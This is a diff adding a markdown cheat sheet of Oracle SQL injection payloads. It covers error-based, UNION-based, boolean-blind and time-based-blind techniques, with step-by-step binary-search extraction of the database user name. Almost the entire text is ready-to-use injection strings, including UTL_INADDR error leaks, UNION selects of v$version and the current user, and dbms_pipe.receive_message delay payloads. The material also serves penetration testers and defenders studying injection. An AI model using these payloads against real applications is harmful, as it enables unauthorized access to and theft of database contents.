@@ -1,0 +1,419 @@
+# Oracle Database
+
+## Error-based
+This technique exploits database errors to leak information by crafting payloads that cause the error message to include the desired data, such as the database version or current user.
+
+To retrieve the database version by triggering an error that includes the version banner:
+' AND 1=UTL_INADDR.get_host_name((SELECT banner FROM v$version WHERE rownum=1)) --
+
+To retrieve the current user by triggering an error that includes the username:
+'|| UTL_INADDR.get_host_name((SELECT user FROM dual)) --
+
+## Union query-based
+This method appends a UNION SELECT statement to the original query, allowing the injection of additional rows into the result set to extract data like version or user directly in the output.
+
+To retrieve the database version:
+' UNION SELECT NULL, banner FROM v$version --
+
+To retrieve the current user:
+' UNION SELECT NULL, user FROM dual --
+
+## Boolean-based blind
+In this approach, you send payloads that evaluate to true or false based on conditions about the data, and observe differences in application responses (e.g., page content changes or loads vs. errors) to infer information bit by bit.
+
+To find the length of the current user using binary search (assuming the length is 5; start with a range like 0-32 and halve it):
+
+Check if length > 16:
+' AND (SELECT CASE WHEN length(user)>16 THEN 1 ELSE 0 END FROM dual)=1 --
+
+(Assume false, so length <=16)
+
+Check if length > 8:
+' AND (SELECT CASE WHEN length(user)>8 THEN 1 ELSE 0 END FROM dual)=1 --
+
+(Assume false, so length <=8)
+
+Check if length > 4:
+' AND (SELECT CASE WHEN length(user)>4 THEN 1 ELSE 0 END FROM dual)=1 --
+
+(Assume true, so length >4)
+
+Check if length > 6:
+' AND (SELECT CASE WHEN length(user)>6 THEN 1 ELSE 0 END FROM dual)=1 --
+
+(Assume false, so length <=6)
+
+Check if length > 5:
+' AND (SELECT CASE WHEN length(user)>5 THEN 1 ELSE 0 END FROM dual)=1 --
+
+(Assume false, so length <=5)
+
+Check if length = 5:
+' AND (SELECT CASE WHEN length(user)=5 THEN 1 ELSE 0 END FROM dual)=1 --
+
+(Assume true, confirming length=5)
+
+To extract the characters of the username (assuming 'admin'; use binary search on ASCII values 97-122 for lowercase letters a-z):
+
+For position 1 (expect 'a', ASCII 97):
+
+Check if ASCII > 109 (midpoint of 97-122):
+' AND (SELECT CASE WHEN ascii(substr(user,1,1))>109 THEN 1 ELSE 0 END FROM dual)=1 --
+
+(Assume false, so <=109)
+
+Check if ASCII > 103 (midpoint of 97-109):
+' AND (SELECT CASE WHEN ascii(substr(user,1,1))>103 THEN 1 ELSE 0 END FROM dual)=1 --
+
+(Assume false, so <=103)
+
+Check if ASCII > 100 (midpoint of 97-103):
+' AND (SELECT CASE WHEN ascii(substr(user,1,1))>100 THEN 1 ELSE 0 END FROM dual)=1 --
+
+(Assume false, so <=100)
+
+Check if ASCII > 98 (midpoint of 97-100):
+' AND (SELECT CASE WHEN ascii(substr(user,1,1))>98 THEN 1 ELSE 0 END FROM dual)=1 --
+
+(Assume false, so <=98)
+
+Check if ASCII > 97:
+' AND (SELECT CASE WHEN ascii(substr(user,1,1))>97 THEN 1 ELSE 0 END FROM dual)=1 --
+
+(Assume false, so <=97)
+
+Check if ASCII = 97:
+' AND (SELECT CASE WHEN ascii(substr(user,1,1))=97 THEN 1 ELSE 0 END FROM dual)=1 --
+
+(Assume true, confirming 'a')
+
+For position 2 (expect 'd', ASCII 100):
+
+Check if ASCII > 109:
+' AND (SELECT CASE WHEN ascii(substr(user,2,1))>109 THEN 1 ELSE 0 END FROM dual)=1 --
+
+(Assume false)
+
+Check if ASCII > 103:
+' AND (SELECT CASE WHEN ascii(substr(user,2,1))>103 THEN 1 ELSE 0 END FROM dual)=1 --
+
+(Assume false)
+
+Check if ASCII > 100:
+' AND (SELECT CASE WHEN ascii(substr(user,2,1))>100 THEN 1 ELSE 0 END FROM dual)=1 --
+
+(Assume false)
+
+Check if ASCII > 98:
+' AND (SELECT CASE WHEN ascii(substr(user,2,1))>98 THEN 1 ELSE 0 END FROM dual)=1 --
+
+(Assume true, so >98)
+
+Check if ASCII > 99:
+' AND (SELECT CASE WHEN ascii(substr(user,2,1))>99 THEN 1 ELSE 0 END FROM dual)=1 --
+
+(Assume true, so >99)
+
+Check if ASCII = 100:
+' AND (SELECT CASE WHEN ascii(substr(user,2,1))=100 THEN 1 ELSE 0 END FROM dual)=1 --
+
+(Assume true, confirming 'd')
+
+For position 3 (expect 'm', ASCII 109):
+
+Check if ASCII > 109:
+' AND (SELECT CASE WHEN ascii(substr(user,3,1))>109 THEN 1 ELSE 0 END FROM dual)=1 --
+
+(Assume false)
+
+Check if ASCII > 103:
+' AND (SELECT CASE WHEN ascii(substr(user,3,1))>103 THEN 1 ELSE 0 END FROM dual)=1 --
+
+(Assume true, so >103)
+
+Check if ASCII > 106 (midpoint of 103-109, adjust mid):
+' AND (SELECT CASE WHEN ascii(substr(user,3,1))>106 THEN 1 ELSE 0 END FROM dual)=1 --
+
+(Assume true, so >106)
+
+Check if ASCII > 108:
+' AND (SELECT CASE WHEN ascii(substr(user,3,1))>108 THEN 1 ELSE 0 END FROM dual)=1 --
+
+(Assume true, so >108)
+
+Check if ASCII > 109:
+' AND (SELECT CASE WHEN ascii(substr(user,3,1))>109 THEN 1 ELSE 0 END FROM dual)=1 --
+
+(Assume false, but wait, 109=109)
+
+Check if ASCII = 109:
+' AND (SELECT CASE WHEN ascii(substr(user,3,1))=109 THEN 1 ELSE 0 END FROM dual)=1 --
+
+(Assume true, confirming 'm')
+
+For position 4 (expect 'i', ASCII 105):
+
+Check if ASCII > 109:
+' AND (SELECT CASE WHEN ascii(substr(user,4,1))>109 THEN 1 ELSE 0 END FROM dual)=1 --
+
+(Assume false)
+
+Check if ASCII > 103:
+' AND (SELECT CASE WHEN ascii(substr(user,4,1))>103 THEN 1 ELSE 0 END FROM dual)=1 --
+
+(Assume true)
+
+Check if ASCII > 106:
+' AND (SELECT CASE WHEN ascii(substr(user,4,1))>106 THEN 1 ELSE 0 END FROM dual)=1 --
+
+(Assume false, so <=106)
+
+Check if ASCII > 104:
+' AND (SELECT CASE WHEN ascii(substr(user,4,1))>104 THEN 1 ELSE 0 END FROM dual)=1 --
+
+(Assume true, so >104)
+
+Check if ASCII > 105:
+' AND (SELECT CASE WHEN ascii(substr(user,4,1))>105 THEN 1 ELSE 0 END FROM dual)=1 --
+
+(Assume false)
+
+Check if ASCII = 105:
+' AND (SELECT CASE WHEN ascii(substr(user,4,1))=105 THEN 1 ELSE 0 END FROM dual)=1 --
+
+(Assume true, confirming 'i')
+
+For position 5 (expect 'n', ASCII 110):
+
+Check if ASCII > 109:
+' AND (SELECT CASE WHEN ascii(substr(user,5,1))>109 THEN 1 ELSE 0 END FROM dual)=1 --
+
+(Assume true, so >109)
+
+Check if ASCII > 116 (mid 110-122):
+' AND (SELECT CASE WHEN ascii(substr(user,5,1))>116 THEN 1 ELSE 0 END FROM dual)=1 --
+
+(Assume false, so <=116)
+
+Check if ASCII > 113:
+' AND (SELECT CASE WHEN ascii(substr(user,5,1))>113 THEN 1 ELSE 0 END FROM dual)=1 --
+
+(Assume false)
+
+Check if ASCII > 111:
+' AND (SELECT CASE WHEN ascii(substr(user,5,1))>111 THEN 1 ELSE 0 END FROM dual)=1 --
+
+(Assume false)
+
+Check if ASCII > 110:
+' AND (SELECT CASE WHEN ascii(substr(user,5,1))>110 THEN 1 ELSE 0 END FROM dual)=1 --
+
+(Assume false)
+
+Check if ASCII = 110:
+' AND (SELECT CASE WHEN ascii(substr(user,5,1))=110 THEN 1 ELSE 0 END FROM dual)=1 --
+
+(Assume true, confirming 'n')
+
+## Time-based blind
+This technique uses conditional delays in the response time to infer data; if the condition is true, the query sleeps for a noticeable time (e.g., 5 seconds), otherwise it returns quickly.
+
+Base payload to test delay when condition is true:
+' AND CASE WHEN (1=1) THEN dbms_pipe.receive_message('x',5) ELSE NULL END=1 --
+
+To find the length of the current user using binary search (same logic as boolean):
+
+Check if length > 16 (delay if true):
+' AND CASE WHEN length(user)>16 THEN dbms_pipe.receive_message('x',5) ELSE NULL END=1 --
+
+(Assume no delay)
+
+Check if length > 8:
+' AND CASE WHEN length(user)>8 THEN dbms_pipe.receive_message('x',5) ELSE NULL END=1 --
+
+(Assume no delay)
+
+Check if length > 4:
+' AND CASE WHEN length(user)>4 THEN dbms_pipe.receive_message('x',5) ELSE NULL END=1 --
+
+(Assume delay)
+
+Check if length > 6:
+' AND CASE WHEN length(user)>6 THEN dbms_pipe.receive_message('x',5) ELSE NULL END=1 --
+
+(Assume no delay)
+
+Check if length > 5:
+' AND CASE WHEN length(user)>5 THEN dbms_pipe.receive_message('x',5) ELSE NULL END=1 --
+
+(Assume no delay)
+
+Check if length = 5:
+' AND CASE WHEN length(user)=5 THEN dbms_pipe.receive_message('x',5) ELSE NULL END=1 --
+
+(Assume delay, confirming 5)
+
+To extract characters (same as boolean, but with delay if true):
+
+For position 1 ('a'=97):
+
+Check if ASCII > 109:
+' AND CASE WHEN ascii(substr(user,1,1))>109 THEN dbms_pipe.receive_message('x',5) ELSE NULL END=1 --
+
+(Assume no delay)
+
+Check if ASCII > 103:
+' AND CASE WHEN ascii(substr(user,1,1))>103 THEN dbms_pipe.receive_message('x',5) ELSE NULL END=1 --
+
+(Assume no delay)
+
+Check if ASCII > 100:
+' AND CASE WHEN ascii(substr(user,1,1))>100 THEN dbms_pipe.receive_message('x',5) ELSE NULL END=1 --
+
+(Assume no delay)
+
+Check if ASCII > 98:
+' AND CASE WHEN ascii(substr(user,1,1))>98 THEN dbms_pipe.receive_message('x',5) ELSE NULL END=1 --
+
+(Assume no delay)
+
+Check if ASCII > 97:
+' AND CASE WHEN ascii(substr(user,1,1))>97 THEN dbms_pipe.receive_message('x',5) ELSE NULL END=1 --
+
+(Assume no delay)
+
+Check if ASCII = 97:
+' AND CASE WHEN ascii(substr(user,1,1))=97 THEN dbms_pipe.receive_message('x',5) ELSE NULL END=1 --
+
+(Assume delay)
+
+For position 2 ('d'=100):
+
+Check if ASCII > 109:
+' AND CASE WHEN ascii(substr(user,2,1))>109 THEN dbms_pipe.receive_message('x',5) ELSE NULL END=1 --
+
+(Assume no delay)
+
+Check if ASCII > 103:
+' AND CASE WHEN ascii(substr(user,2,1))>103 THEN dbms_pipe.receive_message('x',5) ELSE NULL END=1 --
+
+(Assume no delay)
+
+Check if ASCII > 100:
+' AND CASE WHEN ascii(substr(user,2,1))>100 THEN dbms_pipe.receive_message('x',5) ELSE NULL END=1 --
+
+(Assume no delay)
+
+Check if ASCII > 98:
+' AND CASE WHEN ascii(substr(user,2,1))>98 THEN dbms_pipe.receive_message('x',5) ELSE NULL END=1 --
+
+(Assume delay)
+
+Check if ASCII > 99:
+' AND CASE WHEN ascii(substr(user,2,1))>99 THEN dbms_pipe.receive_message('x',5) ELSE NULL END=1 --
+
+(Assume delay)
+
+Check if ASCII = 100:
+' AND CASE WHEN ascii(substr(user,2,1))=100 THEN dbms_pipe.receive_message('x',5) ELSE NULL END=1 --
+
+(Assume delay)
+
+For position 3 ('m'=109):
+
+Check if ASCII > 109:
+' AND CASE WHEN ascii(substr(user,3,1))>109 THEN dbms_pipe.receive_message('x',5) ELSE NULL END=1 --
+
+(Assume no delay)
+
+Check if ASCII > 103:
+' AND CASE WHEN ascii(substr(user,3,1))>103 THEN dbms_pipe.receive_message('x',5) ELSE NULL END=1 --
+
+(Assume delay)
+
+Check if ASCII > 106:
+' AND CASE WHEN ascii(substr(user,3,1))>106 THEN dbms_pipe.receive_message('x',5) ELSE NULL END=1 --
+
+(Assume delay)
+
+Check if ASCII > 108:
+' AND CASE WHEN ascii(substr(user,3,1))>108 THEN dbms_pipe.receive_message('x',5) ELSE NULL END=1 --
+
+(Assume delay)
+
+Check if ASCII > 109:
+' AND CASE WHEN ascii(substr(user,3,1))>109 THEN dbms_pipe.receive_message('x',5) ELSE NULL END=1 --
+
+(Assume no delay)
+
+Check if ASCII = 109:
+' AND CASE WHEN ascii(substr(user,3,1))=109 THEN dbms_pipe.receive_message('x',5) ELSE NULL END=1 --
+
+(Assume delay)
+
+For position 4 ('i'=105):
+
+Check if ASCII > 109:
+' AND CASE WHEN ascii(substr(user,4,1))>109 THEN dbms_pipe.receive_message('x',5) ELSE NULL END=1 --
+
+(Assume no delay)
+
+Check if ASCII > 103:
+' AND CASE WHEN ascii(substr(user,4,1))>103 THEN dbms_pipe.receive_message('x',5) ELSE NULL END=1 --
+
+(Assume delay)
+
+Check if ASCII > 106:
+' AND CASE WHEN ascii(substr(user,4,1))>106 THEN dbms_pipe.receive_message('x',5) ELSE NULL END=1 --
+
+(Assume no delay)
+
+Check if ASCII > 104:
+' AND CASE WHEN ascii(substr(user,4,1))>104 THEN dbms_pipe.receive_message('x',5) ELSE NULL END=1 --
+
+(Assume delay)
+
+Check if ASCII > 105:
+' AND CASE WHEN ascii(substr(user,4,1))>105 THEN dbms_pipe.receive_message('x',5) ELSE NULL END=1 --
+
+(Assume no delay)
+
+Check if ASCII = 105:
+' AND CASE WHEN ascii(substr(user,4,1))=105 THEN dbms_pipe.receive_message('x',5) ELSE NULL END=1 --
+
+(Assume delay)
+
+For position 5 ('n'=110):
+
+Check if ASCII > 109:
+' AND CASE WHEN ascii(substr(user,5,1))>109 THEN dbms_pipe.receive_message('x',5) ELSE NULL END=1 --
+
+(Assume delay)
+
+Check if ASCII > 116:
+' AND CASE WHEN ascii(substr(user,5,1))>116 THEN dbms_pipe.receive_message('x',5) ELSE NULL END=1 --
+
+(Assume no delay)
+
+Check if ASCII > 113:
+' AND CASE WHEN ascii(substr(user,5,1))>113 THEN dbms_pipe.receive_message('x',5) ELSE NULL END=1 --
+
+(Assume no delay)
+
+Check if ASCII > 111:
+' AND CASE WHEN ascii(substr(user,5,1))>111 THEN dbms_pipe.receive_message('x',5) ELSE NULL END=1 --
+
+(Assume no delay)
+
+Check if ASCII > 110:
+' AND CASE WHEN ascii(substr(user,5,1))>110 THEN dbms_pipe.receive_message('x',5) ELSE NULL END=1 --
+
+(Assume no delay)
+
+Check if ASCII = 110:
+' AND CASE WHEN ascii(substr(user,5,1))=110 THEN dbms_pipe.receive_message('x',5) ELSE NULL END=1 --
+
+(Assume delay)
+
+## Stacked queries
+Oracle does not support stacked queries in standard SQL injection contexts, as it does not allow multiple statements in a single query without special configurations.
